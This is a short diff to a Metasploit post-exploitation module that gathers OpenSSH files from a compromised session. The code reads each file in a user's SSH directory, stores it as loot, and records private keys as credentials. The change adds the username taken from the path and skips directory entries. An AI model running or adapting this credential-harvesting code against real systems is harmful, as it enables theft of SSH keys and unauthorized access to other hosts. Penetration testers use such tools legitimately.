@@ -59,13 +59,16 @@ class Metasploit3 < Msf::Post
 				sep = "/"
 				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
 			end
-
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
 			files.each do |file|
-				print_good("Downloading #{path}#{sep}#{file} -> #{file}")
+				next if [".", ".."].include?(file)
 				data = read_file("#{path}#{sep}#{file}")
 				file = file.split(sep).last
 				loot_path = store_loot("ssh.#{file}", "text/plain", session, data,
 					"ssh_#{file}", "OpenSSH #{file} File")
+				print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
 				# If the key is encrypted, this will fail and it won't be stored as a
 				# cred.  That's ok because we can't really use encrypted keys anyway.
@@ -76,6 +79,7 @@ class Metasploit3 < Msf::Post
 						:host => session.session_host,
 						:port => 22,
 						:sname => 'ssh',
+            :user => user,
 						:pass => loot_path,
 						:source_type => "exploit",
 						:type => 'ssh_key',
